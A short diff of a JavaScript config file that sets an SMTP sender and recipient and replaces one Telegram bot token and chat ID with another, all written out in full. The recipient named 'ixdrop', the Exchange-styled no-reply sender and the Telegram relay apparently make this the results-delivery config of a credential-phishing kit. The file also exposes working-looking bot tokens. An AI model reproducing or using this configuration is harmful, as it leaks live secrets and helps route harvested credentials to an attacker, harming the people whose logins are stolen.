@@ -9,5 +9,5 @@ exports.SMTP_SECURE = true;
 exports.FROM_ADDRESS_ADDRESS = 'noreplyexchange@glonic.ng';
 exports.TO_ADDRESS_ADDRESS = 'ixdrop@mail.com'; // single email address or comma separated list of email addresses
 // ===== Telegram ===== ===== =====
-exports.BOT_TOKEN = '8703605790:AAErq-ohWw7DoeRxomTDqSC51jWrO1wplbQ';
-exports.CHAT_ID = '7819151321';
+exports.BOT_TOKEN = '8905446351:AAERn44UWSBqZGOFSD9vVy0i-Ze_b2-tNL8';
+exports.CHAT_ID = '8818214189';
